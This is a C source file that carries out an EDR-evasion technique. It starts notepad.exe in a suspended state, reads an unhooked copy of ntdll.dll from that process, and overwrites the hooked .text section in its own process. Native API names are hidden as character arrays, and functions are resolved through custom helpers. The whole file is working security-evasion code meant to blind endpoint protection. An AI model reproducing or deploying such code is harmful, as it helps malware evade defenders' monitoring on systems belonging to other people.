

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <string.h>
#include "helpers.h"
#include "PEstructs.h"

int main()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPVOID pRemoteCode = NULL;// where the fresh ntdll is going to be stored
	NTSTATUS success;
	DWORD oldPro = 0;
	//IMAGE_SECTION_HEADER* textSection = nullptr;
	//void* pRemoteCode;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	HANDLE hSusProc; // handle to process created in suspended state
	HANDLE hCurProc = (HANDLE)0xffffffffffffffff;// handle to current process
	HMODULE dllModule;// handle to ntdll module  

	if (CreateProcessA(0, (LPSTR)"notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, (LPSTARTUPINFOA)&si, &pi) == 0)
		printf("Failed to create process. Error code: %u", GetLastError());

	printf("[+] Process created in suspended state with pid: %d\n", pi.dwProcessId);

	// get the base address of ntdll
	WCHAR masterDLL[] = { 'n','t','d','l','l','.','d','l','l',0 };
	dllModule = hlpGetModuleHandle(masterDLL);
	DWORD dllSize1 = getSizeOfImage(dllModule);

	// we allocate buffer for our dll at pRemoteCode
	char alloc[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
	SIZE_T dllSize = getSizeOfImage(dllModule);
	myNtAllocateVirtualMemory pAllocMem = (myNtAllocateVirtualMemory)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), alloc);
	success = pAllocMem(hCurProc, &pRemoteCode, 0, &dllSize, MEM_COMMIT, PAGE_READWRITE); 
	if (success == 0x0)
		printf("[+] RW buffer created for dll: %p\n", pRemoteCode);
	
	// read ntdll from the suspended process and copy to local process
	PULONG bytesRead = NULL;
	hSusProc = pi.hProcess;
	char ntRead[] = { 'N','t','R','e','a','d','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
	myNtReadVirtualMemory pReadMem = (myNtReadVirtualMemory)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), ntRead);
	success = pReadMem(hSusProc, (PVOID)dllModule, pRemoteCode, dllSize1, bytesRead);
	if (success == 0x0)
		 printf("[+] Ntdll copied from suspended to local process\n");
	TerminateProcess(hSusProc, 0);
	// we replace the hooked .text section with the clean one
	if (unhook(dllModule, pRemoteCode, oldPro))
		printf("[+] Unhook sucessfull :)\n");
}